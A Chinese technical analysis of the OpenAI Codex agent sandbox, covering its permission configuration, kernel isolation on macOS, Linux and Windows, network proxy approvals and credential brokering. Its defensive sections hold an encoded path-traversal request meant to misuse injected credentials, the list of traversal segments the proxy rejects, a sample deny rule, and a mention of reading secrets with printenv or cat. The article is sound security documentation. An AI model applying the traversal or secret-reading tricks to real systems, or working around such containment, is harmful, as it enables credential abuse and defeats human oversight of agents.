# OpenAI Codex 沙箱机制：配置模型、跨平台内核隔离与网络生命周期

> **核心公理**: $$\text{Harness} = \text{Agent} - \text{Model}$$
> 在 Agent Harness 工程中，沙箱（Sandboxing）是保护宿主环境不受失控或恶意代码破坏的底线物理防线。大模型仅负责生成意图与命令，所有的外部调用、文件操作与网络请求均被严格囚禁在操作系统内核级外壳内。

---

## 🧩 0. 认知基准：Sandbox四维隔离模型 vs Agent Sandbox生产深水区

在构建或评估不可信代码执行环境时，业界通常使用**四维隔离模型**来抽象操作系统的防爆边界；然而，当沙箱应用于 **自主智能体（Autonomous Agent）** 这一特定工程场景时，由于大模型需要**自主联网安装依赖、读写工作区源码、执行编译构建**，通用的隔离模型会迅速撞上复杂的工程反模式与安全暗礁。

### 0.1 通用理论抽象：沙箱的四维隔离模型

在经典系统安全中，沙箱被划分为四个正交的防护维度：

![沙箱的四维隔离模型](../assets/sandbox_4d_isolation_model.png)

1. **文件隔离**：限定可读范围，限定可写目录，防止未授权遍历或破坏宿主磁盘。
2. **网络策略**：允许必要连接，拦截未授权访问，切断恶意流量出入。
3. **进程隔离与权限边界**：沙箱不仅要管“进程能访问哪些文件”，还要管“它能看到谁、干涉谁、能否变成更有权力的身份，以及结束时如何清场”。
4. **资源限额**：约束 CPU、内存、磁盘以及进程数与执行时长，防止拒绝服务（DoS）。

这一抽象模型清晰明了，构成了理解沙箱技术的入门基准。

---

### 0.2 工程范式跃迁：走向 Agent 生产深水区

然而，**不可信的大模型生成代码并非普通的恶意样本分析**——Agent 拥有合法的“改代码”与“联外网”诉求。如果直接照搬通用模型的字面限制（如简单地将“写入封闭在工程目录之内”或“切断网络杜绝外泄”），将导致沙箱直接被击穿或完全丧失可用性。

为了应对这一矛盾，工业级 Agent 执行环境（以 OpenAI Codex 为代表）必须从**“被动隔离限制”**跃迁至**“零信任动态治理与中继”**的生产深水区：

![Agent 执行沙箱的四维深水区模型](../assets/sandbox_agent_deep_water.png)

> 图示中的 Broker 隔离针对受管凭据，启用条件与回退例外见第 4 节；DNS 双阶段检查用于降低重绑定风险，检查与实际连接之间的竞态及防护限制见第 6.4 节。

#### 四维深水区的工程对齐与认知跃迁

| 隔离维度 | 表面层次（经典理论抽象） | 生产深水区（Agent Harness 真实落地） | 深度逆向解析 / 认知进度 |
| :--- | :--- | :--- | :--- |
| **① 文件隔离** | 限定可读 / 限定可写在工程目录内 | **元数据动态抠洞（Carveouts）+ 防 Git Hook 提权**：<br/>• 强制把 `.git`/`.codex` 等关键配置重挂为只读；<br/>• 内核级 `deny file-write-unlink` 锁死父目录，封死重命名改名逃逸。 | ✅ **已消化掌握**（详见本文第 5 节） |
| **② 网络策略** | 允许必要连接 / 拦截未授权访问 | **Credential Broker 受管凭据中继 + SSRF 实时探针**：<br/>• 启用 Broker 后，对识别并纳入管理的环境凭据实施 Dummy Token 虚拟化；本地连接等例外需另行核验；<br/>• DNS/IP 分类检查与适用路径中的双阶段复核用于降低 DNS 重绑定风险，不保证完全消除。 | ✅ **已消化掌握**（详见本文第 4 节、第 6 节） |
| **③ 进程隔离与权限边界** | 能看到谁 / 干涉谁 / 能否获得更大权限 | **进程约束与清场**：<br/>• 运行时：限制查看、影响其他进程，以及自行获得更大身份权限。<br/>• 结束时：通过进程组等机制管理子进程，具体清理范围受执行路径影响。 | 基础机制见 [[openai_codex_sandbox_processes\|进程隔离与权限边界]]；平台行为与清理范围仍待验证（见第 7 节） |
| **④ 资源限额** | CPU · 内存 · 磁盘 · 进程数量 · 运行时间 | **资源消耗的基本限制**：<br/>• 沙箱怎样限制 CPU、内存、进程数量和运行时间？<br/>• 为什么限制访问权限，不能替代限制资源消耗？ | 基础机制见 [[openai_codex_sandbox_resources\|资源限额专题]]；实际环境配额待验证 |

```
💡 核心安全公理：
  1. Harness = Agent - Model （外壳接管不可信模型的所有物理动作）
  2. Credential Broker 按配置隔离受管凭据，不保证沙箱中的所有机密归零
  3. Writable Workspace = Project \ Protected Metadata （工作区写权限强制抠除受保护元数据）
```

---

## 🗺️ 1. 沙箱配置模型与权限编译

Codex 提供了**粗粒度模式**与**细粒度权限配置文件（Permission Profiles）**两套配置机制，并严格遵循“默认封闭（Fail-Closed）”的零信任原则。

### 1.1 粗粒度模式：`SandboxMode`

在 `codex-rs/protocol/src/config_types.rs` 中定义了三种基础模式：

```rust
pub enum SandboxMode {
    #[default]
    ReadOnly,          // 全局只读，默认禁止出站网络
    WorkspaceWrite,    // 默认授予根目录读取权限；写入限于工作区、按配置开放的临时目录及额外授权目录，受保护路径除外
    DangerFullAccess,  // 完全禁用沙箱，拥有宿主当前用户的完整权限
}
```

针对 `WorkspaceWrite`，可通过 `[sandbox_workspace_write]` 进行参数调整（如 `writable_roots` 额外白名单目录、`network_access` 是否放行外部网络、是否排除 `/tmp` 等）。

### 1.2 细粒度权限配置：`[permissions]` 体系

在 `config.toml` 中，Codex 支持通过声明式的 Profile 实现细粒度控制，支持单继承（`extends`）机制：

```toml
[permissions.secure-dev]
description = "Restricted dev profile"
extends = ":workspace"

[permissions.secure-dev.filesystem]
glob_scan_max_depth = 3

[permissions.secure-dev.filesystem.":workspace_roots"]
"**/*.env" = "deny"
"credentials.json" = "deny"
"build/**" = "write"

[permissions.secure-dev.network.domains]
"api.openai.com" = "allow"
"*.github.com"   = "allow"
```

### 1.3 默认配置与网络策略的生效条件

配置文件是否存在、命令是否允许联网、网络代理是否启用，是不同的问题。根据本次核验的源码快照（提交 `44fe510`，2026-09-28），需要区分以下事实：

1. **配置加载器支持缺失 `config.toml` 的情况**：
   - 加载器在相应配置文件不存在（`NotFound`）时返回空表，继续配置加载。
   - 测试中的文件不存在断言验证了该处理路径，不能据此断言所有安装方式和首次启动环境中都不存在 `~/.codex/config.toml`。文件缺失也不意味着其他配置来源均不存在。
2. **代理默认配置未启用，也未预置域名规则**：
   - `NetworkProxyConfig::default()` 中，`enabled = false`、`domains = None`。
   - `domains = None` 不能证明代理已启动，更不能推出所有外联都会进入代理并等待审批。实际会话应以最终生效的配置为准。
3. **命令网络权限与代理开关分别控制**：

   | 命令网络访问 | 网络代理 | 对应行为 |
   | :--- | :--- | :--- |
   | 关闭 | 关闭或开启 | 代理开关不会自动赋予命令联网权限 |
   | 开启 | 关闭 | 命令的网络连接不受这套代理域名规则过滤 |
   | 开启 | 开启 | 命令网络请求进入代理策略处理；未配置允许规则的公网目标默认不获放行 |

   对未授权请求，是直接拒绝还是进入审批，还取决于生效的审批策略和运行时支持，不能统一表述为“100% 拦截并挂起”。上述开关关系描述用户配置的常规路径；管理员托管的网络要求可能另外配置和启动代理，也应检查最终生效的策略。

> **一手依据**：[缺失配置文件的加载处理](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/config/src/loader/mod.rs#L604)、[代理配置默认值](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/network-proxy/src/config.rs#L177)、[官方网络访问配置说明](https://learn.chatgpt.com/docs/agent-approvals-security#network-access)。

---

## 🛡️ 2. 跨平台操作系统沙箱引擎

Codex 在 `codex-rs/sandboxing` 中抽象了 `SandboxManager`，将抽象的执行需求转译为具体操作系统的内核调用机制。

```mermaid
graph TD
    classDef mac fill:#e1f5fe,stroke:#0288d1,stroke-width:2px;
    classDef linux fill:#e8f8f5,stroke:#26a69a,stroke-width:2px;
    classDef win fill:#fff3e0,stroke:#e65100,stroke-width:2px;

    REQ["执行请求 (SandboxTransformRequest)"]
    MGR["SandboxManager 调度中枢"]
    
    REQ --> MGR
    MGR -->|"macOS"| MAC["Apple Seatbelt (/usr/bin/sandbox-exec)<br/>SBPL 规则引擎"]:::mac
    MGR -->|"Linux"| LNX["Bubblewrap (bwrap) + Seccomp<br/>Namespaces + UDS 路由桥"]:::linux
    MGR -->|"Windows"| WIN["Restricted Token / Elevated Service<br/>受限令牌与私有桌面"]:::win
```



### 2.1 macOS 引擎：Apple Seatbelt

- **系统调用加固**：使用绝对路径 `/usr/bin/sandbox-exec` 运行（防止 `PATH` 环境变量劫持）。
- **默认关闭**：加载 `seatbelt_base_policy.sbpl`，起点规则为 `(deny default)`。
- **网络限制（小孔原则）**：在 `seatbelt.rs` 动态生成的 SBPL 规则中，仅放行向宿主机 Loopback 代理端口的出站连接：
  ```lisp
  (allow network-outbound (remote ip "localhost:{port}"))
  ```
  沙箱内若试图向任何公网 IP 发起直连 TCP Socket，直接被 macOS 内核以 `EPERM` 拦截。

### 2.2 Linux 引擎：Bubblewrap + 跨命名空间中继网桥

在 Linux 上，无法照搬 macOS 的做法。

#### 为什么 Linux 不能直接连 `127.0.0.1` 代理端口？

- Linux 下 Codex 启用 **Network Namespace (`--unshare-net`)** 实现内核级网络隔离。
- 一旦进入独立的网络命名空间，沙箱内只有独立的虚拟 `lo` 网卡，**与宿主机的 `127.0.0.1` 在物理上互不相通**。

#### Codex 的跨命名空间中继黑科技（`proxy_routing.rs`）

为了让隔离 NetNS 内的进程连上宿主机的 `codex-network-proxy`，Codex 设计了一套基于 **文件描述符（FD）跨命名空间传递** 的 **TCP $\to$ UDS $\to$ TCP** 网桥：

```mermaid
sequenceDiagram
    autonumber
    participant HostBridge as 宿主机 Host Bridge Worker
    participant Sandbox as 沙箱进程 (bwrap --unshare-net)
    participant Proxy as 宿主机 codex-network-proxy

    Note over HostBridge,Sandbox: 1. 进入沙箱前：通过 UnixStream::pair() 建立控制信道
    Sandbox->>Sandbox: 2. 隔离 NetNS 内激活 lo，并在随机端口 bind() 生成 TcpListener
    Sandbox->>HostBridge: 3. 通过 UDS 经由 SCM_RIGHTS 将该 Listener 的 FD 传给宿主进程
    Note over HostBridge: 4. 关键：Socket 的 NetNS 绑定在创建瞬间。宿主进程调用 accept() 监听的正是沙箱内流量！
    Sandbox->>Sandbox: 5. 重写环境变量 HTTP_PROXY=http://127.0.0.1:{沙箱随机端口}
    Sandbox->>Sandbox: 6. 应用 PR_SET_NO_NEW_PRIVS + Seccomp 封死后续新建 socket
    
    Note over Sandbox,Proxy: 双向中继通信
    Sandbox->>HostBridge: curl 发起请求 -> 命中沙箱内监听端口
    HostBridge->>Proxy: 宿主 Bridge 连接真实代理端口 (注入 Attribution Token 鉴权)
    Proxy-->>HostBridge: 校验通过并处理请求
    HostBridge-->>Sandbox: 双向转发数据
```



---

## 🌐 3. 网络沙箱完整生命周期与白名单治理

网络请求的处理取决于命令网络权限、代理是否启用、目标规则及审批策略，不能将“初始阻断 → 人工审批 → 动态扩充 → 稳态放行”视为所有 Codex 零配置启动时必经的过程。

### 3.1 代理启用后的请求处理示例

**以下流程以命令网络访问已开启、网络代理已启用为前提。**在其他网络安全检查也通过的情况下，命中允许规则的目标可直接放行；未命中允许规则的请求可能进入审批，也可能直接被拒绝。显式拒绝规则不能被当作普通的“未命中允许规则”进入放行流程。

```mermaid
graph TD
    classDef start fill:#f5f5f5,stroke:#616161,stroke-width:2px;
    classDef decision fill:#fff3e0,stroke:#e65100,stroke-width:2px;
    classDef allow fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px;
    classDef deny fill:#ffebee,stroke:#c62828,stroke-width:2px;
    classDef dynamic fill:#e3f2fd,stroke:#1565c0,stroke-width:2px;

    REQ["沙箱内工具发起外联<br/>(例如 curl https://api.github.com)"]:::start
    PROXY["到达宿主 codex-network-proxy"]:::start
    DENIED{"是否命中拒绝规则？"}:::decision
    CHECK{"是否命中允许规则？"}:::decision
    
    FAST["直接放行 (Decision: Allow)"]:::allow
    OUTBOUND["由宿主机真实网卡出站请求<br/>(向公网目标建立 TCP/TLS)"]:::allow
    
    BLOCK["判定为 NotAllowed (未授权)"]:::deny
    CAN_APPROVE{"当前策略和运行时<br/>是否允许发起网络审批？"}:::decision
    SUSPEND["挂起连接 (tokio 异步暂停)"]:::decision
    APPROVAL["触发 AskForApproval 审批流程<br/>(弹出 NetworkAccess 确认卡片)"]:::decision
    
    USER_DECIDE{"用户是否批准？"}:::decision
    KILL["切断连接<br/>(返回 HTTP 403 / TCP RST)"]:::deny
    
    EXPAND["按审批决策处理授权<br/>(授权范围取决于决策类型)"]:::dynamic
    RESUME["唤醒挂起的连接"]:::dynamic

    REQ --> PROXY
    PROXY --> DENIED
    DENIED -->|"是"| KILL
    DENIED -->|"否"| CHECK
    CHECK -->|"命中允许规则"| FAST
    FAST --> OUTBOUND
    
    CHECK -->|"未命中允许规则"| BLOCK
    BLOCK --> CAN_APPROVE
    CAN_APPROVE -->|"否"| KILL
    CAN_APPROVE -->|"是"| SUSPEND
    SUSPEND --> APPROVAL
    APPROVAL --> USER_DECIDE
    
    USER_DECIDE -->|"拒绝 / 超时"| KILL
    USER_DECIDE -->|"允许"| EXPAND
    EXPAND --> RESUME
    RESUME --> OUTBOUND
```



---

### 3.2 白名单的配置语法与规则

域名白名单核心解析逻辑位于 `codex-rs/network-proxy/src/policy.rs`，支持严格的 Hostname 语法规范：

```toml
[permissions.workspace.network.domains]
"api.openai.com"    = "allow"   # 1. 精确匹配
"*.github.com"      = "allow"   # 2. 单星通配符 (Subdomains Only)
"**.huggingface.co" = "allow"   # 3. 双星通配符 (Apex + Subdomains)
"api?.example.com"  = "allow"   # 4. 单字符通配符
"127.0.0.1"         = "allow"   # 5. IP 字面量 (本地/私有 IP 需显式声明)
"evil.example"      = "deny"    # 6. 显式黑名单 (Deny)
```

1. **精确匹配（Exact）**：如 `"api.openai.com"`，只匹配该完整主机名，不匹配顶级域名 `openai.com` 也不匹配三级子域名。
2. **单星通配（`*.`）**：如 `"*.github.com"`，仅匹配严格子域名（如 `api.github.com`、`raw.github.com`），**明确排除**顶层域名 `github.com` 本身。
3. **双星通配（`**/*.`）**：如 `"**.huggingface.co"`，**同时匹配**顶层域名 `huggingface.co` 及其任意层级的所有子域名。
4. **单字符问号（`?`）**：如 `"api?.example.com"`，匹配单一字符（例如 `api1.example.com`）。
5. **IP 字面量与本地回环限制**：
  - 私有网络与回环地址（`127.0.0.1`、`localhost`、`10.x.x.x`）出于安全防护默认禁止，即使配置了通配符也无法放行；
  - 必须在配置中**显式书写精确的 IP 字面量或 `localhost`** 才能允许。
6. **Deny 优先原则**：
  - `Deny` 规则的优先级绝对高于 `Allow`。如果目标主机同时命中了允许规则与拒绝规则，一律判定为阻断。

---

### 3.3 网络审批：单次允许、会话允许与长期规则

当请求访问未获授权的网络目标时，如果当前策略和运行时允许发起审批，界面可以提供不同范围的授权选项：

| 选项 | 含义 |
| :--- | :--- |
| **AllowOnce：仅本次允许** | 放行本次请求，不因此保存长期规则 |
| **AllowForSession：本会话允许** | 在当前会话内复用该目标的授权，不等于下次会话仍然有效 |
| **允许以后访问该主机** | 明确保存允许规则；成功保存后可跨会话生效 |

**第三种选项并非每个客户端、每次弹窗都会提供。**在本次核验的 Codex CLI 源码快照（提交 `44fe510`，2026-09-28）中，它的界面文案是 “Yes, and allow this host in the future”，对应内部的网络策略修改决策 `NetworkPolicyAmendment`。界面根据审批请求中可用的决策生成选项，不能因为后端支持该决策，就断言当前客户端一定会展示它。如果弹窗只有前两个选项，就不能把点击“允许”理解成永久加入白名单。

长期授权需要明确保存规则。笔记所引用的 `append_network_rule_and_update()` 将规则写入 `CODEX_HOME/rules/default.rules`，通常是 `~/.codex/rules/default.rules`，不能直接称为“当前项目 `.codex/` 下的规则”。也可以通过配置文件维护域名允许规则。

保存后的规则仍受最终生效的网络权限和更高优先级策略约束；删除或修改规则也会改变后续访问行为。**单次批准、会话批准和保存长期规则是不同决策，不是点击一次“允许”后必然依次发生的三个步骤。**

> **一手源码依据**：[CLI 审批选项文案](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/tui/src/bottom_pane/approval_overlay.rs#L883)、[默认可用决策的生成条件](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/protocol/src/approvals.rs#L365)、[规则保存路径](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/core/src/exec_policy.rs#L867)。

---

### 3.4 并发与锁治理：多线程访问相同域名不同内容的处理

在实际软件构建中，沙箱进程经常会并发向同一个域名发起对**不同资源路径（Path）**的网络请求（例如并发执行 `curl https://api.github.com/repos` 与 `curl https://api.github.com/user`，或者多线程构建下载依赖）。

Codex 在 `codex-rs/core/src/tools/network_approval.rs` 中设计了一套极其精妙的 **Singleflight 锁与去重机制**，避免并发连接导致审批弹窗风暴：

```mermaid
sequenceDiagram
    autonumber
    participant T1 as 线程 1 (访问 /repos)
    participant T2 as 线程 2 (访问 /user)
    participant Service as NetworkApprovalService
    participant UI as 用户界面 (AskForApproval)

    Note over T1,T2: 并发发起对 api.github.com 的不同请求
    T1->>Service: 1. 请求接入 (解析为 HostApprovalKey)
    T2->>Service: 1. 请求接入 (解析为相同 HostApprovalKey)
    
    Service->>Service: 2. get_or_create_pending_approval
    Note over Service: 判定：T1 先到达成为 Owner (is_owner=true)<br/>T2 拿到相同的 PendingApproval (is_owner=false)
    
    T1->>UI: 3. T1 触发真实的弹窗卡片 ("允许访问 api.github.com?")
    T2->>T2: 4. T2 调用 wait_for_decision().await 挂起监听 Notify
    
    UI-->>T1: 5. 用户点击批准 (Allow)
    T1->>Service: 6. T1 设置决策并触发 notify.notify_waiters()
    Service-->>T2: 7. 全局广播唤醒 T2！
    
    Note over T1,T2: 两条连接同时获批，各自通过宿主代理向远端传输真实数据
```



#### 关键锁与并发设计细节：

1. **域名粒度归一化（`HostApprovalKey`）**：
    审批与权限锁定的最小颗粒度是 **Host（协议 + 主机名 + 端口 + 环境 ID）**，**而不是具体的 URL 路径**。
   因此，无论沙箱内多线程访问同一域名下的什么不同资源路径，在核心调度层都被归一化为同一个审批键：
2. **会话缓存快速路径锁（`session_policy_commit_lock`）**：
    服务首先在轻量锁内检查 `session_approved_hosts`。如果之前该会话已经批准过该 Host，则无需进入审批流程，直接返回 `NetworkDecision::Allow` 放行。
3. **Leader / Follower 竞态去重（Singleflight）**：
    针对首次并发访问未授权域名，通过内部互斥锁管理 `pending_host_approvals`：
  - **Leader (Owner)**：第一个抢到锁的线程成为 `is_owner = true`，负责组装审批上下文向用户弹出唯一的审批卡片；
  - **Follower**：后到达的并发线程拿到同一个 `Arc<PendingHostApproval>`，直接进入异步等待。
4. **单次批准全局广播唤醒（`tokio::sync::Notify`）**：
    `PendingHostApproval` 内部基于 `SyncOnceLock` 与 `Notify` 构建：
   当用户在前端点击批准后，Owner 线程执行 `set_decision(decision)` 并调用 `self.notify.notify_waiters()`。所有挂起的 Follower 线程瞬间被全部唤醒，共享该放行决策，各自继续完成后续的网络通信。
   **核心价值**：即便并发打来数十个网络请求，用户也仅会收到一次审批卡片，体验平滑且无并发冲突。

---

## 🔑 4. 凭据隔离机制：Credential Broker 的管理范围与条件

在 Agent 执行环境中，大模型编写的代码通常需要调用外部授权服务（如 `git push` 到 GitHub、调用内部模型 API 网关等）。如果简单地将 `GITHUB_TOKEN` 或 `OPENAI_API_KEY` 明文注入到沙箱的环境变量中，将带来极其致命的安全漏洞：大模型生成的不可信代码（或第三方 npm/pip 恶意依赖）只需一行 `printenv` 或 `cat` 即可彻底窃取机密。

为降低子进程直接接触真实凭据的风险，Codex 在 `network-proxy` 模块中实现了 **Credential Broker（凭证中继与代理治理系统）**。在 Broker 已启用、凭据被 Provider 识别并纳入管理、且未触发真实凭据回退的情况下，传给子进程的相关凭据会被替换为 **Dummy Token**；受支持的请求经过代理并通过凭据匹配与授权检查后，再由代理注入真实凭据。

**这是对受管凭据的有条件隔离，不是“整个沙箱零机密”的保证。**需要明确以下边界：

- **启用条件**：本次核验的源码快照（提交 `44fe510`，2026-09-28）中，`NetworkProxyConfig::default()` 的 `enabled`、`credential_broker` 和 `mitm` 均为 `false`。实际会话是否启用这些能力，应检查最终生效的配置，不能仅凭使用了 Codex 沙箱就认定 Broker 已启用。
- **管理范围**：虚拟化依赖内置或配置的 Provider、匹配规则及处理路径。不能据此保证未被识别的自定义秘密、磁盘上的 SSH 私钥或其他可读配置文件已经隐藏；Broker 也不替代文件系统读取限制。
- **真实凭据回退**：启用 `allow_local_binding = true` 时，为兼容绕过代理的本地连接，Broker 会在构造子进程环境时恢复部分绑定此类目标的真实凭据。因此不能宣称子进程“全程只能看到 Dummy Token”。
- **能力边界**：隐藏凭据原值不等于禁止使用其授权能力。子进程仍可能通过代理调用获准的接口，操作范围还取决于凭据权限和代理授权策略。

> **一手源码依据**：[代理与 Broker 的配置默认值](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/network-proxy/src/config.rs#L177)、[本地连接相关凭据的子进程环境恢复分支](https://github.com/openai/codex/blob/44fe510ce3ee61c8ef623adcbf89b901c73ddd61/codex-rs/network-proxy/src/credential_broker.rs#L983)。下述流程图仅展示 Broker 启用后、受管凭据经代理使用且未发生回退的路径。

### 4.1 全流程闭环架构

Credential Broker 形成了覆盖**环境虚拟化 $\to$ 沙箱隔离执行 $\to$ 延迟探针拦截 $\to$ 防穿透校验 $\to$ 动态凭据注入**的完整闭环：

```mermaid
sequenceDiagram
    autonumber
    participant Host as 宿主环境 (Codex Core)
    participant Broker as Credential Broker 引擎
    participant Sandbox as 沙箱子进程 (Untrusted Code)
    participant Proxy as 本地网络代理 (codex-network-proxy)
    participant Upstream as 上游目标服务器 (api.github.com)

    Note over Host,Broker: 1. 启动前：凭证虚拟化
    Host->>Broker: 传入真实环境变量 (含真实 Token)
    Broker->>Broker: 为识别并纳入管理的凭据生成 Dummy Token，替换相关环境变量与别名
    Broker->>Host: 注入 CODEX_NETWORK_PROXY_CREDENTIAL_BROKER_ACTIVE="1"
    
    Note over Host,Sandbox: 2. 隔离执行
    Host->>Sandbox: 启动受限沙箱进程 (本路径中的受管凭据为 Dummy Token)
    Sandbox->>Sandbox: 执行命令 (如 curl -H "Authorization: Bearer ghp_xxx" ...)
    
    Note over Sandbox,Proxy: 3. 强制代理与协议探针
    Sandbox->>Proxy: 经由 HTTP/SOCKS 代理发出请求
    Proxy->>Proxy: peek_protocol 探针：预读 5 字节判定 TLS/HTTP
    Proxy->>Proxy: is_safe_for_authorization 审计：防路径穿越混淆
    Proxy->>Proxy: select_credentials 匹配：将 Dummy 替换为 Real Token
    
    Note over Proxy,Upstream: 4. 真实凭据出站
    Proxy->>Upstream: 携带真实 Authorization 报文头请求
    Upstream-->>Proxy: 返回正常业务响应 (200 OK)
    Proxy-->>Sandbox: 透传业务数据
```

---

### 4.2 核心机制与一手工程细节

#### 1. 形状保持的替身生成（Shape-Preserving Dummy Token）
如果代理简单地将凭据替换为随机的 UUID 或无意义字符串，沙箱内的 CLI 工具（如 `gh`）或各类官方 SDK 会在向外发包前先执行本地正则表达式或长度校验，导致客户端在沙箱内直接报错崩溃。

在 `credential_broker/providers.rs` 中，Codex 实现了 `shaped_dummy_value` 机制：
- **前缀保持**：严格保持原始前缀（如 `ghp_`、`github_pat_`、`sk-proj-`）；
- **绝对等长**：生成的 Dummy Token 字符长度与真实 Token 完全一致；
- **字符位置映射**：如果在真实 Token 的特定索引位置存在非字母数字的分隔字符，Dummy Token 会在完全相同的索引位置保留这些符号，其余位置填充随机字符。

#### 2. 双轨 Provider 体系
系统支持内置与自定义两套凭证提供者模型：
- **内置 Provider（Built-in）**：
  - **GitHub**：覆盖 `GH_TOKEN`、`GITHUB_TOKEN`、`GH_ENTERPRISE_TOKEN`；绑定 `api.github.com`、`github.com`、`*.ghe.com`，并根据 `GH_HOST` 动态计算私有企业版域名。
  - **OpenAI**：覆盖 `OPENAI_API_KEY`，前缀识别 `sk-proj-`、`sk-svcacct-`（排除 `sk-ant-` 等竞品）；结合 `OPENAI_BASE_URL` 动态绑定私有网关。
- **声明式可配置 Provider（Configured）**：
  在 `config.toml` 中通过 `[features.network_proxy.credential_providers]` 声明：
  ```toml
  [features.network_proxy.credential_providers.my_service]
  env = ["MY_API_KEY"]
  patterns = ["mykey_[a-zA-Z0-9]{32}"]
  url_prefixes = ["https://api.my-corp.internal/v1/"]
  auth = ["bearer"]
  ```
  代理层支持 `bearer`、`token`、`basic`、`header` 四种认证格式。

#### 3. 环境变量与全文字符串虚拟化（Virtualization & Aliases）
真实项目中，Token 常被拼接进复杂字符串（如 `DATABASE_URL=postgres://user:TOKEN@host/db`）或赋给自定义别名。
- `matching.rs` 和 `replacement.rs` 按受管凭据及其匹配规则扫描环境变量字符串，将匹配到的凭据子串替换为 Dummy Token，并建立别名映射记录（`CredentialAlias`）；这不是对任意秘密的通用识别保证。
- **本地连接回退（Local Binding Bypass）**：启用 `allow_local_binding = true` 时，Broker 在构造子进程环境的阶段，对属于当前环境且绑定了可绕过代理的本地目标的凭据恢复真实值，以兼容本地开发与 Mock 测试。恢复发生在子进程环境准备阶段，不是等到每条请求到达代理后才恢复；这是子进程可能接触真实凭据的明确例外。

#### 4. 延迟解密与协议探针（Protocol Peeking）
对所有经过 CONNECT 隧道的流量强行执行 TLS MITM 解密会破坏 SSH over Proxy 或长连接非 HTTP 协议。
Codex 在 `brokered_tunnel.rs` 中设计了 `peek_protocol` 探针：
- 当目标主机匹配已登记的凭证目标时，代理状态机被标记为 `HostMitmRequirement::Credential`；
- 建立隧道后，代理设置 250ms 超时**预读前 5 个字节**：
  - 若匹配 TLS 握手报文头（`0x16 0x03`）：激活 TLS 解密管线；
  - 若解析出标准 HTTP 请求行（`GET ... HTTP/1.1`）：转入 HTTP 解密；
  - 若为其它未识别的 TCP 字节流或发生超时：降级为**透明转发（Opaque Forwarding）**，绝不破坏现有非 HTTP 通信。

#### 5. 请求防篡改与路径混淆防御（Path Traversal & Parser Differential）
在 Agent 安全模型中，**沙箱代码属于完全不可信代码（Untrusted）**。如果系统只做简单的 URL 前缀白名单匹配（如仅授权访问只读端点 `https://api.corp/v1/public/`），恶意代码可能会利用 URL 编码与相对路径穿越构造请求：
$$\text{GET } /v1/public/\%2e\%2e/admin/delete\_user$$

如果代理只按字符串前缀判断，误以为是合规路径而注入了高权凭据，而上游服务器（如 Nginx/Go）在接收到请求后执行了 URL 解码与路径折叠（Fold），就会导致高权凭据在敏感接口上被滥用。

在 `authorization_path.rs` 中，Codex 实现了严格的防护：
1. **原始线缆路径一致性对比**：比较原始网络包上的 `raw_path` 与解析后的 `request.path()`，凡是检测到编码差异直接拒绝注入；
2. **`is_safe_for_authorization` 逐段字符审计**：拆解 URL 路径分段，拒绝任何包含 `.`、`..`、`\`、`%2e%2e`、`%2f`、`%252e`（双重编码）等具有“向上逃逸”特征的畸形分段；
3. **Fail-Closed（默认拒绝）**：一旦路径判定不安全，代理立刻放弃凭据注入，保留 Dummy Token 原样发往上游，上游服务器因校验 Dummy Token 失败返回 `401 Unauthorized`，彻底切断越权风险。

#### 6. Shell 快照与凭证治理（Shell Snapshot Integration）

在命令行工具调度中，Codex 引入 Shell 快照（Shell Snapshot）以减少重复初始化开销，并在 Broker 启用的相关路径中处理快照中的受管凭据，降低真实凭据随快照落盘或重放的风险。这不构成对所有秘密“零泄露”的保证。

##### 6.1 Shell 如何启动，以及为什么复用环境快照

**1. 运行命令前，先准备能找到工具的环境**

以新启动一个 Zsh 进程执行 `git status` 为例，Harness 启动 Shell 程序，由 Shell 执行命令并返回结果。初始化主要是在准备“工具装在哪里、有哪些环境变量和函数”等信息，例如 Homebrew 的路径、版本管理器初始化结果及 `GIT_SSH_COMMAND`。是否需要额外加载启动配置，取决于继承的环境与命令需求，不能说所有命令都必须使用登录式或交互式 Shell。

```text
启动 Shell → 读取适用的启动配置、准备环境 → 执行命令 → 返回结果
```

**2. 登录式与交互式是两个不同的开关**

```bash
zsh -lc "git status"
```

这条命令启动的是登录式、非交互式 Shell：`-l` 表示登录式启动，`-c` 表示执行后面的命令；强制交互式启动使用 `-i`。在默认启动规则下：

- Zsh 首先读取系统级 `zshenv`；启用相应启动选项时，再读取用户的 `.zshenv`。
- 登录式启动会读取适用的 `zprofile` 和 `zlogin`。
- 交互式启动才会自动读取适用的 `zshrc`；`zsh -lc` 本身不自动读取 `.zshrc`，除非其他配置或脚本显式加载它。
- 用户启动文件的位置由 `ZDOTDIR` 决定，未设置时使用用户主目录；系统级文件路径也可能随安装方式变化。

本次核验的 Codex 源码快照（提交 `44fe510`，2026-09-28）中，某些快照捕获路径会通过 `shell_startup_script()` **显式加载用户的 `.zshrc`**。这是 Harness 的额外动作，不能混同于 `zsh -lc` 自身的默认行为。是否加载 Oh My Zsh 插件、执行 `brew shellenv`，取决于实际启动脚本内容。

**3. 快照保存环境状态，减少重复初始化**

```text
捕获时：准备环境 → 将可捕获的函数、别名、选项和导出变量保存为快照
重放时：启动 Shell → 加载可用快照、恢复环境 → 执行命令 → 返回结果
```

**快照保存的是环境状态，不是一个一直活着的 Shell 进程。**在快照可用且执行路径支持时，加载快照可以减少重复执行启动脚本的工作；不能据此保证后续完全跳过初始化、所有命令都使用快照，或与用户日常交互终端完全一致。上述流程描述快照捕获与重放，不将所有工具调用概括为每次都新建 Shell。

**4. 性能收益需要测量**

重复执行启动脚本可能增加短命令的总耗时，但实际收益取决于启动脚本、机器、命令、快照是否可用及执行配置。本文尚无对应的测量数据，因此不提供固定毫秒数、耗时占比或加速倍数，也不把全部额外耗时归因于沙箱的内核检查。

